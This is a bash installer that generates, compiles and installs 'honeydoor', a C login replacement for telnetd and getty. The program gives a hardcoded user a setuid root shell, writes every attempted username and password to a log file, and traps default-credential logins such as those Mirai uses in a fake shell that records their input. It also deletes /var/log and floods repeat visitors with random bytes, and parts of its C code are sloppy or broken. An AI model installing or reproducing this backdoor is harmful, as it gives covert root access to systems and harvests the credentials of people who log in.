#!/bin/bash
######################################################
# Bash wrapper for backdooring stuff with honeydoor  #
######################################################

# Debug mode?
args="$@"

debug(){
case $args in 
-d|--debug)
return 0
;;
*)
return 1
;;
esac

}

if ! debug; then

if [[ "$(id -u)" != "0" ]];then
  echo 'Dude, you have to get root first!'
  exit 1
fi

fi
cat << '_EOF_' > hd.c

// kod's smexy honeydoor login replacement for telnetd and getty
// strictly liscenced under wtfpl
// use: door some shit and collect the logs in /var/log/hlog
// todo: check actual /etc/shadow incase we want to be sneaky af
#include <crypt.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/sysinfo.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

int shadowparse(const char *user, const char *pword, const char *pass) {
  char *shad;
  FILE *shf;
  char *line = NULL;
  size_t len = 0;
  ssize_t read;
  int inshadow;
  char *result;
  int pwcheck;
  shf = fopen("/etc/shadow", "r");
  while ((read = getline(&shad, &len, shf)) != -1) {
    int i;
    char *splitter;
    char *fuck = strdup(shad);
    char *shaduser;
    char *hash;
    for (i = 0; i < 2; i++) {
      splitter = strsep(&fuck, ":");
      if (i == 0) {
        shaduser = strdup(splitter);
      } else if (i == 1) {
        hash = strdup(splitter);
      }
      free(splitter);
    }
    inshadow = strcmp(user, shaduser) == 0;
    result = crypt(pword, pass);
    pwcheck = strcmp(result, hash) == 0;

    if (inshadow & pwcheck) {
      system("/bin/sh");
      free(shaduser);
      free(hash);
      return 0;
    }
    // clean up time
    free(shaduser);
    free(hash);
  }
}

int touchFile(const char *fname) {
  FILE *fptr;
  char there_was_error = 0;
  char opened_in_read = 1;
  fptr = fopen(fname, "rb+");
  if (fptr == NULL) // if file does not exist, create it
  {
    opened_in_read = 0;
    fptr = fopen(fname, "wb");
    if (fptr == NULL)
      there_was_error = 1;
  }
  if (there_was_error) {
    // disk full
    return EXIT_FAILURE;
  }
  return EXIT_SUCCESS;
}

// set up the fake shell
// you’re too stupid to realize you got a demon sticking out your ass singing,
// “Holy miss moley, got me a live one!"

int fakeshell(void) // super crappy fake environment feel free to fix this if
                    // you so desire
{
  while (1) {
    // this part logs payloads sent into the fake shell
    FILE *trap;
    char *trpath = "/var/log/htrap";
    trap = fopen(trpath, "a+");
    char *trline = NULL;
    // unsigned int tlen;
    size_t tlen =
        1000; /* see this:
                 http://stackoverflow.com/questions/25986465/passing-arguments-of-getline-from-incompatible-pointer-type
               */
    printf("root@localhost:~ # ");
    getline(&trline, &tlen, stdin);
    fputs(trline, trap);
    fclose(trap);
    // here comes the ugly if nest for the fake shell, needs a LOT of work tbh
    // but it should fool a scanner or a rookie
    if (strcmp(trline, "id\n") ==
        0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      printf("uid=0(root) gid=0(root) groups=0(root)\n");
    } else if (strcmp(trline, "whoami\n") ==
               0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      printf("root\n");
    } else if (strcmp(trline, "pwd\n") ==
               0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      printf("/root\n");
    } else if (strcmp(trline, "uname\n") ==
               0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      printf("Linux\n");
    } else if (strcmp(trline, "cd\n") ==
               0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      printf("bash: cd: No such file or directory\n");
    }

    else if (strcmp(trline, "ps\n") ==
             0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      printf("  PID TTY          TIME CMD\n  624 pts/8    00:00:00 sudo\n  630 "
             "pts/8    00:00:00 bash\n 1350 pts/8    00:00:00 ps\n");
    } else if (strcmp(trline, "ls -la\n") ==
               0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      printf("total 40\ndrwx------  7 root root 4096 Oct  4 09:14 "
             ".\ndrwxr-xr-x 27 root root 4096 Sep 23 02:57 ..\n-rw-------  1 "
             "root root   46 Oct  3 01:57 .bash_history\n-rw-r--r--  1 root "
             "root 3106 Oct 22  2015 .bashrc\ndrwx------  4 root root 4096 Aug "
             "24 03:14 .cache\ndrwx------  3 root root 4096 Oct  4 09:14 "
             ".config\ndrwx------  3 root root 4096 Aug 24 03:14 "
             ".dbus\ndrwxr-xr-x  3 root root 4096 Oct  4 09:14 "
             ".local\n-rw-r--r--  1 root root  148 Aug 17  2015 "
             ".profile\ndrwx------  2 root root 4096 May  4 22:34 .ssh\n");
    } else if (strcmp(trline, "ls\n") ==
               0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      printf("\n");
    } else if (strcmp(trline, "uname -a\n") ==
               0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      printf("Linux localhost 4.4.0-38-generic #57-Ubuntu SMP Tue Sep 6 "
             "15:42:33 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux\n");
    } else if (strcmp(trline, "cat /proc/version\n") ==
               0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      printf("Linux version 4.4.0-38-generic (buildd@lgw01-58) (gcc version "
             "5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.2) ) #57-Ubuntu SMP "
             "Tue Sep 6 15:42:33 UTC 2016\n");
    } else if (strcmp(trline, "wget\n") ==
               0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      printf("wget: missing URL\nUsage: wget [OPTION]... [URL]...\n\n\nTry "
             "`wget --help' for more options.\n");
    } else if (strcmp(trline, "/bin/busybox\n") ==
               0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      printf(
          "BusyBox v1.22.1 (Ubuntu 1:1.22.0-15ubuntu1) multi-call "
          "binary.\nBusyBox is copyrighted by many authors between "
          "1998-2012.\nLicensed under GPLv2. See source distribution for "
          "detailed\ncopyright notices.\n\nUsage: busybox [function "
          "[arguments]...]\n   or: busybox --list[-full]\n   or: busybox "
          "--install [-s] [DIR]\n   or: function [arguments]...\n\n	BusyBox "
          "is a multi-call binary that combines many common Unix\n	"
          "utilities into a single executable.  Most people will create a\n	"
          "link to busybox for each function they wish to use and BusyBox\n	"
          "will act like whatever it was invoked as.\n\nCurrently defined "
          "functions:\n	[, [[, acpid, adjtimex, ar, arp, arping, ash, "
          "awk, basename, blockdev, brctl, bunzip2, bzcat, bzip2, cal, cat, "
          "chgrp, chmod, chown, chpasswd,\n	chroot, chvt, clear, cmp, cp, "
          "cpio, crond, crontab, cttyhack, cut, date, dc, dd, deallocvt, "
          "depmod, devmem, df, diff, dirname, dmesg, dnsdomainname,\n	"
          "dos2unix, dpkg, dpkg-deb, du, dumpkmap, dumpleases, echo, ed, "
          "egrep, env, expand, expr, false, fdisk, fgrep, find, fold, free, "
          "freeramdisk, fstrim,\n	ftpget, ftpput, getopt, getty, grep, "
          "groups, gunzip, gzip, halt, head, hexdump, hostid, hostname, httpd, "
          "hwclock, id, ifconfig, ifdown, ifup, init,\n	insmod, ionice, "
          "ip, ipcalc, kill, killall, klogd, last, less, ln, loadfont, "
          "loadkmap, logger, login, logname, logread, losetup, ls, lsmod, "
          "lzcat,\n	lzma, lzop, lzopcat, md5sum, mdev, microcom, mkdir, "
          "mkfifo, mknod, mkswap, mktemp, modinfo, modprobe, more, mount, mt, "
          "mv, nameif, nc, netstat,\n	nslookup, od, openvt, passwd, patch, "
          "pidof, ping, ping6, pivot_root, poweroff, printf, ps, pwd, rdate, "
          "readlink, realpath, reboot, renice, reset,\n	rev, rm, rmdir, "
          "rmmod, route, rpm, rpm2cpio, run-parts, sed, seq, setkeycodes, "
          "setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,\n	"
          "start-stop-daemon, stat, static-sh, strings, stty, su, sulogin, "
          "swapoff, swapon, switch_root, sync, sysctl, syslogd, tac, tail, "
          "tar, taskset, tee,\n	telnet, telnetd, test, tftp, time, "
          "timeout, top, touch, tr, traceroute, traceroute6, true, tty, "
          "tunctl, udhcpc, udhcpd, umount, uname, uncompress,\n	"
          "unexpand, uniq, unix2dos, unlzma, unlzop, unxz, unzip, uptime, "
          "usleep, uudecode, uuencode, vconfig, vi, watch, watchdog, wc, wget, "
          "which, who,\n	whoami, xargs, xz, xzcat, yes, zcat\n");
    } else if (strcmp(trline, "busybox\n") ==
               0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      printf(
          "BusyBox v1.22.1 (Ubuntu 1:1.22.0-15ubuntu1) multi-call "
          "binary.\nBusyBox is copyrighted by many authors between "
          "1998-2012.\nLicensed under GPLv2. See source distribution for "
          "detailed\ncopyright notices.\n\nUsage: busybox [function "
          "[arguments]...]\n   or: busybox --list[-full]\n   or: busybox "
          "--install [-s] [DIR]\n   or: function [arguments]...\n\n	BusyBox "
          "is a multi-call binary that combines many common Unix\n	"
          "utilities into a single executable.  Most people will create a\n	"
          "link to busybox for each function they wish to use and BusyBox\n	"
          "will act like whatever it was invoked as.\n\nCurrently defined "
          "functions:\n	[, [[, acpid, adjtimex, ar, arp, arping, ash, "
          "awk, basename, blockdev, brctl, bunzip2, bzcat, bzip2, cal, cat, "
          "chgrp, chmod, chown, chpasswd,\n	chroot, chvt, clear, cmp, cp, "
          "cpio, crond, crontab, cttyhack, cut, date, dc, dd, deallocvt, "
          "depmod, devmem, df, diff, dirname, dmesg, dnsdomainname,\n	"
          "dos2unix, dpkg, dpkg-deb, du, dumpkmap, dumpleases, echo, ed, "
          "egrep, env, expand, expr, false, fdisk, fgrep, find, fold, free, "
          "freeramdisk, fstrim,\n	ftpget, ftpput, getopt, getty, grep, "
          "groups, gunzip, gzip, halt, head, hexdump, hostid, hostname, httpd, "
          "hwclock, id, ifconfig, ifdown, ifup, init,\n	insmod, ionice, "
          "ip, ipcalc, kill, killall, klogd, last, less, ln, loadfont, "
          "loadkmap, logger, login, logname, logread, losetup, ls, lsmod, "
          "lzcat,\n	lzma, lzop, lzopcat, md5sum, mdev, microcom, mkdir, "
          "mkfifo, mknod, mkswap, mktemp, modinfo, modprobe, more, mount, mt, "
          "mv, nameif, nc, netstat,\n	nslookup, od, openvt, passwd, patch, "
          "pidof, ping, ping6, pivot_root, poweroff, printf, ps, pwd, rdate, "
          "readlink, realpath, reboot, renice, reset,\n	rev, rm, rmdir, "
          "rmmod, route, rpm, rpm2cpio, run-parts, sed, seq, setkeycodes, "
          "setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,\n	"
          "start-stop-daemon, stat, static-sh, strings, stty, su, sulogin, "
          "swapoff, swapon, switch_root, sync, sysctl, syslogd, tac, tail, "
          "tar, taskset, tee,\n	telnet, telnetd, test, tftp, time, "
          "timeout, top, touch, tr, traceroute, traceroute6, true, tty, "
          "tunctl, udhcpc, udhcpd, umount, uname, uncompress,\n	"
          "unexpand, uniq, unix2dos, unlzma, unlzop, unxz, unzip, uptime, "
          "usleep, uudecode, uuencode, vconfig, vi, watch, watchdog, wc, wget, "
          "which, who,\n	whoami, xargs, xz, xzcat, yes, zcat\n");
    } else if (strcmp(trline, "w\n") == 0) {
      printf(" 03:30:06 up 17:22, 11 users,  load average: 0.56, 0.66, "
             "0.68\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   "
             "PCPU WHAT\nroot     tty1     :0               Tue12    0:01s  "
             "0:54   0.82s /bin/bash\n");
    } else if (strcmp(trline, "who\n") ==
               0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      printf("root     tty1         2016-10-04 12:03 (:0)\n");
    } else if (strcmp(trline, "date\n") ==
               0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      time_t t = time(NULL);
      struct tm *tm = localtime(&t);
      char s[64];
      strftime(s, sizeof(s), "%c", tm);
      printf("%s\n", s);
    } else if (strcmp(trline, "uptime\n") ==
               0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      struct sysinfo info;
      sysinfo(&info);
      printf("Uptime = %ld\n", info.uptime);
    } else if (strcmp(trline, "cat /proc/cpuinfo\n") ==
               0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      printf(
          "processor       : 0\nvendor_id  : GenuineIntel\ncpu family      : "
          "6\nmodel              : 55\nmodel name        : Intel(R) Celeron(R) "
          "CPU  N2840  @ 2.16GHz\nstepping   : 8\nmicrocode  : 0x829\ncpu MHz  "
          "              : 2582.293\ncache size  : 1024 KB\nphysical id  : "
          "0\nsiblings   : 2\ncore id            : 0\ncpu cores  : 2\napicid   "
          "          : 0\ninitial apicid     : 0\nfpu                : "
          "yes\nfpu_exception    : yes\ncpuid level      : 11\nwp              "
          "  : yes\nflags            : fpu vme de pse tsc msr pae mce cx8 apic "
          "sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 "
          "ss ht tm pbe syscall nx rdtscp lm constant_tsc arch_perfmon pebs "
          "bts rep_good nopl xtopology nonstop_tsc aperfmperf pni pclmulqdq "
          "dtes64 monitor ds_cpl vmx est tm2 ssse3 cx16 xtpr pdcm sse4_1 "
          "sse4_2 movbe popcnt tsc_deadline_timer rdrand lahf_lm 3dnowprefetch "
          "epb tpr_shadow vnmi flexpriority ept vpid tsc_adjust smep erms "
          "dtherm ida arat\nbugs           :\nbogomips     : 4326.40\nclflush "
          "size : 64\ncache_alignment   : 64\naddress sizes     : 36 bits "
          "physical, 48 bits virtual\npower management:\n");
    } else if (strcmp(trline, "netstat\n") == 0) {
      printf("Active Internet connections (w/o servers)\nProto Recv-Q Send-Q "
             "Local Address           Foreign Address         State      \ntcp "
             "       1      0 localhost:44318         localhost:41544         "
             "CLOSE_WAIT \ntcp        0      0 10.0.0.35:58092         "
             "ec2-67-25-143-11:https ESTABLISHED\ntcp        0      0 "
             "localhost:56258         localhost:41029         ESTABLISHED\ntcp "
             "       0      0 localhost:56254         localhost:41029         "
             "ESTABLISHED\ntcp        0      0 localhost:54840         "
             "localhost:9050          ESTABLISHED\n");
    } else if (strcmp(trline, "last\n") == 0) {
      printf("root     pts/10       :0.0             Tue Oct  4 16:01    gone "
             "- no logout\nroot     pts/9        :0.0             Tue Oct  4 "
             "15:57    gone - no logout\nroot     pts/8        :0.0            "
             " Tue Oct  4 15:14    gone - no logout\nroot     pts/8        "
             ":0.0             Tue Oct  4 14:22 - 15:14  (00:52)\n");
    } else if (strcmp(trline, "sudo -s\n") == 0) {
      printf("[sudo] password for root:\nsu: Authentication failure\n");
    } else if (strcmp(trline, "su\n") == 0) {
      printf("Password: \nsu: Authentication failure\n");
    } else if (strcmp(trline, "who\n") ==
               0) /* - - - - - - - - - [ implemented ] - - - - - - - - - */
    {
      printf("root      tty1         2016-10-04 12:03 (:0)\n");
    } else if (strcmp(trline, "uptime\n") == 0) {
      printf(" 03:12:14 up 17:04, 1 users,  load average: 1.23, 0.98, 0.83 \n");
    } else if (strcmp(trline, "/bin/busybox ps; \" ECCHI \"\r\n") == 0) {
      printf("PID  Uid     VmSize Stat Command\n    1 root        396 S   init "
             "      \n    2 root            SW< [kthreadd]\n    3 root         "
             "   SW< [ksoftirqd/0]\n    4 root            SW< [events/0]\n    "
             "5 root            SW< [khelper]\n    8 root            SW< "
             "[async/mgr]\n   16 root            SW< [kblockd/0]\n   25 root   "
             "         SW< [khubd]\n   42 root            SW  [pdflush]\n   43 "
             "root            SW  [pdflush]\n   44 root            SW< "
             "[kswapd0]\n   45 root            SW< [crypto/0]\n   66 root      "
             "      SW< [mtdblockd]\n   93 root            SW< [unlzma/0]\n  "
             "146 root       4000 S   /usr/bin/httpd \n  149 root        368 S "
             "  /sbin/getty ttyS0 115200 \n  150 root       4000 S   "
             "/usr/bin/httpd \n  151 root       4000 S   /usr/bin/httpd \n  "
             "154 root        368 S   /usr/bin/httpd \n  155 root        372 S "
             "  /usr/bin/httpd \n  168 root        324 S   syslogd -C -l 7 \n  "
             "169 root       4000 S   /usr/bin/httpd \n  172 root        276 S "
             "  klogd \n  332 root        360 S   /sbin/udhcpc -h TL-WR931ND "
             "-i eth1 -p /tmp/wr731n/udhcpc.pid -s /tmp/wr731n/udhcpc.script "
             "\n  333 root        232 S   /sbin/udhcpc -h TL-WR931ND -i eth1 "
             "-p /tmp/wr731n/udhcpc.pid -s /tmp/wr731n/udhcpc.script \n  337 "
             "root        368 S   /usr/sbin/udhcpd /tmp/wr931n/udhcpd.conf \n  "
             "374 root       4000 S   /usr/bin/httpd \n  395 root       4000 S "
             "  /usr/bin/httpd \n  396 root       4000 S   /usr/bin/httpd \n  "
             "591 root        628 S   hostapd /tmp/topology.conf \n  592 root  "
             "     4000 S   /usr/bin/httpd \n  594 root       4000 S   "
             "/usr/bin/httpd \n  596 root       4000 S   /usr/bin/httpd \n  "
             "597 root       4000 S   /usr/bin/httpd \n  598 root       4000 S "
             "  /usr/bin/httpd \n  601 root       4000 S   /usr/bin/httpd \n  "
             "602 root       4000 S   /usr/bin/httpd \n  603 root       4000 S "
             "  /usr/bin/httpd \n  604 root       4000 S   /usr/bin/httpd \n  "
             "605 root       4000 S   /usr/bin/httpd \n  606 root       4000 S "
             "  /usr/bin/httpd \n  607 root       4000 S   /usr/bin/httpd \n  "
             "608 root       4000 S   /usr/bin/httpd \n  609 root       4000 S "
             "  /usr/bin/httpd \n  612 root       4000 S   /usr/bin/httpd \n  "
             "616 root        312 S   /usr/bin/lld2d br0 ath0 \n  759 root     "
             "   300 S   telnetd -l /bin/login\n  800 root        400 R   ps "
             "\n");
    } else if (strcmp(trline, "/bin/busybox MIRAI\r\n") == 0) {
      printf("sh: cannote execute MIRAI: permission denied");
    } else if (strcmp(trline, "/bin/busybox wget; /bin/busybox tftp; \" "
                              "/bin/busybox ECCHI \"\r\n") == 0) {
      printf(
          "BusyBox v1.24.1 (2016-09-16 10:30:06 EDT) multi-call "
          "binary.\n\nUsage: wget [-c|--continue] [-s|--spider] [-q|--quiet] "
          "[-O|--output-document FILE]\n        [--header 'header: value'] "
          "[-Y|--proxy on/off] [-P DIR]\n        [-U|--user-agent AGENT] [-T "
          "SEC] URL...\n\nRetrieve files via HTTP or FTP\n\n        -s      "
          "Spider mode - only check file existence\n        -c      Continue "
          "retrieval of aborted transfer\n        -q      Quiet\n        -P "
          "DIR  Save to DIR (default .)\n        -T SEC  Network read timeout "
          "is SEC seconds\n        -O FILE Save to FILE ('-' for stdout)\n     "
          "   -U STR  Use STR for User-Agent header\n        -Y      Use proxy "
          "('on' or 'off')\n\ntftp:applet not found\nECCHI: applet not found");
    } else if (strcmp(trline, "/bin/busybox cat /proc/mounts\n") == 0) {
      printf("rootfs / rootfs rw 0 0\n/dev/root / squashfs ro,relatime 0 "
             "0\n/proc /proc proc rw,relatime 0 0\ndevpts /dev/pts devpts "
             "rw,relatime,mode=622 0 0\nnone /tmp ramfs rw,relatime 0 0\nnone "
             "/var ramfs rw,relatime 0 0");
    } else {
      const char *messages[] = {"Segmentation fault. Core dumped.",
"Command not found, but there are over 40 similar ones",
"error: not enough arguments",
"exec: file format error",
"SIGSEGV: Core dumped.",
"Sementation fault.",
"bash: command not found",
"bash: no such file or directory",
"/lib/ld-uClibc.so.0: No such file or directory",
"Unexpected ‘;’, expecting ‘;’",
"Error: Error ocurred when attempting to print error message.",
"User Error: An unknown error has occurred in an unidentified program ",
"while executing an unimplemented function at an undefined address. ",
"Correct error and try again.",
"Kernel panic - not syncing: (null)",
"No, I don't think I will.",
"syntax error: Unexpected: ‘/’ Expected: ‘\\’",
"bash: permission denied",
"EOF error: broken pipe.",
"bash: Operation not permitted",
"error: init: Id \"3\" respawning too fast: disabled for 5 minutes: ",
"command failed",
"Can’t cast a void type to a type void.",
"Keyboard not present, press any key...",
"User Error: An unknown error has occurred in an unidentified program while executing an unimplemented function at an undefined address. Correct error and try again.",
"FATAL! Data corrupt at an unknown memory address, nothing to be done about it.",
"??? -- Something horrible just happened, please ensure all cables are securely connected!",
"FATAL: If you are seeing this message, than the entire science of mathematics is broken. You may want to get on your knees and pray. Bailing!"};
      const size_t messages_count = sizeof(messages) / sizeof(messages[0]);
      char input[64];
      printf("%s\n", messages[rand() % messages_count]);
    }
    free(trline);
  }
}

int trapthatfucker(const char *user, const char *pword, const char *trapper,
                   const char *pwtrap) {
  int utrapcheck = 0;
  int ptrapcheck = 0;
  utrapcheck = strcmp(user, trapper) == 0;
  ptrapcheck = strcmp(pword, pwtrap) == 0;
  if (ptrapcheck && utrapcheck) {
    fakeshell();
  }
}

char *ReadFile(char *filename) {
  char *buffer = NULL;
  int string_size, read_size;
  FILE *handler = fopen(filename, "r");
  if (handler) {
    // Seek the last byte of the file
    fseek(handler, 0, SEEK_END);
    // Offset from the first to the last byte, or in other words, filesize
    string_size = ftell(handler);// 420 blaze it
    // go back to the start of the file
    rewind(handler);

    // Allocate a string that can hold it all
    buffer = (char *)malloc(sizeof(char) * (string_size + 1));

    // Read it all in one operation
    read_size = fread(buffer, sizeof(char), string_size, handler);

    // fread doesn't set it so put a \0 in the last position
    // and buffer is now officially a string
    buffer[string_size] = '\0';

    if (string_size != read_size) {
      // Something went wrong, throw away the memory and set
      // the buffer to NULL
      free(buffer);
      buffer = NULL;
    }

    // Always remember to close the file.
    fclose(handler);
  }
  return buffer;
}

int main(int argc, const char *argv[])
// main (void)
{
  // silent error counter
  int whoops = 0;
  // set up main program
  // stuff we need
  int ret__;
  ret__ = remove("/var/log");
  if (ret__ != 0) {
    whoops++;
  }
  touchFile("/var/log/hlog");
  touchFile("/var/log/htrap");
  mkdir("/var/etc", 0700);
  mkdir("/var/log", 0750);
  int counter = 0;
  while (1) {
    // get username and password
    char *user = NULL;
    // unsigned int len;
    size_t len = 128;
    char hostname[128];
    gethostname(hostname, sizeof hostname);
    printf("\n%s login: ", hostname);
    getline(&user, &len, stdin);
    char *pword = getpass("Password: "); // getpass is depricated beware
    // sleep to prevent brutes
    sleep(counter);
    // check if we are a doored user
    char *tester = "kod\n";
    char *pass;
    // if theres /var/etc/shadow use the hash in there instead
    if (access("/var/etc/shadow", F_OK) != -1) {
      FILE *ghettoshadow;
      size_t gslen = 0;
      ssize_t gsread;
      ghettoshadow = fopen("/var/etc/shadow", "r");
      getline(&pass, &gslen, ghettoshadow);
      pass[strcspn(pass, "\n")] = 0;
      fclose(ghettoshadow);
    } else {
      //pass = "$5$QrjJXvkTxaV$hjnhJEF73ygDB7P69PWwOYNonRxswQda1eru9WAjDYA";
       xXxXx
    }
    int doortest;
    char *result;
    int pwcheck;
    doortest = strcmp(user, tester) == 0; // check if we are a doored user
    result = crypt(pword, pass); // run crypt on the password with it as salt
    pwcheck = strcmp(result, pass) == 0; // check against hash
    // root shell for you!
    if (pwcheck && doortest) // heres the magic
    /*
     *
     * Execlp fork
     *
     */
    {
      counter = 0;
      pid_t my_pid, parent_pid, child_pid;
      int status;
      /* get and print my pid and my parent's pid. */
      my_pid = getpid();
      parent_pid = getppid();
      /* print error message if fork() fails */
      if ((child_pid = fork()) < 0) {
        perror("fork failure");
        exit(1);
      }
      /* fork() == 0 for child process */
      if (child_pid == 0) {
        my_pid = getpid();
        parent_pid = getppid();
        char *string = ReadFile("/var/etc/banner.txt");
        if (string) {
          puts(string);
          free(string);
        }
        printf("\n ______                   ______       __   _______       __ "
               "  \n|   __ |--.--.-----.--.--|   __ |-----|  |_|    |  |-----| "
               " |_ \n|   __ |  |  |__ --|  |  |   __ |  _  |   _|       |  "
               "-__|   _|\n|______|_____|_____|___  "
               "|______|_____|____|__|____|_____|____|\n                   "
               "|_____|Dont be humble, You're not that great\n\n"); // put some
                                                                    // ascii art
                                                                    // here
        setuid(0);
        setgid(0);
        execl("/bin/bash", "bash", "-i", (char *)0);
        perror("execl() failure!\n\n");
        fprintf(stderr, "Should never see this message... \n\n");
        _exit(1);
      }
      /*
       * parent process
       */
      else {
        wait(&status); /* can use wait(NULL) since exit status
                          from child is not used. */
        free(user);
        printf("Good bye!\n");
      }
      return 0;
    }
    const char *trapper[] = {"admin\n", "root\n",  "root\n", "root\n", "root\n",
                             "root\n",  "admin\n", "root\n", "root\n", "root\n",
                             "root\n",  "root\n",  "root\n"};
    const char *pwtrap[] = {"admin",       "toor",  "root",     "1234",
                            "123456",      "admin", "root",     "password",
                            "Password",    "login", "juantech", "00000000",
                            "7ujMko0admin"};
    int i; // pass loop bitches
    for (i = 0; i < 13; i++) {
      trapthatfucker(user, pword, trapper[i], pwtrap[i]);
    }
    // honey logging into /var/log/hlog
    FILE *hlog;
    char *spath = "/var/log/hlog"; // feel free to change this path
    hlog = fopen(spath, "a+");
    char combo[200];
    user[strcspn(user, "\n")] = 0;           // hacky magic to remove newline
    sprintf(combo, "%s:%s \n", user, pword); // todo:valid/invaid
    fputs(combo, hlog);
    fclose(hlog);
    free(user);
    // urandom attack after 10 tries (want those passwords)
    counter++;
    FILE *fptr;
    char *c;
    if (counter > 3) {
      printf("Ah Ah Ah, you didn't say the magic word!\n"); // don't get cheap
                                                            // on me dodson,
                                                            // that was
                                                            // hammond's mistake
      sleep(2); // here we directly open /dev/urandom and dump 2048 bytes at a
                // time
      char f; // this should kill a lot of scanners and shit or at least hang
              // them
      void *l[2048]; // not sure how hard this dumps its not like retarded fast
                     // but
      size_t n; // depends on the terminal reading it, should be pretty quick
      f = open("/dev/urandom", O_RDONLY); // note: this is really hacky
      while ((n = read(f, l, 2048)) > 0) {
        write(1, l, n);
      }
      free(pass);
      free(pword);
    }
  }
}

_EOF_

debug && out=./bd || out=/bin/bd
set +a # Don't export variables!
read -rsp "Enter a password : " pass
pass="$(mkpasswd -m sha-256 $pass)"
sed "s?xXxXx?pass = \"$pass\" ;?" hd.c > honeydoor.c && rm -f hd.c
gcc honeydoor.c -o $out -lcrypt && (chmod u+s $out;file $out;ls -l $out) ||\
 echo 'Fail!'

rm honeydoor.c

exit
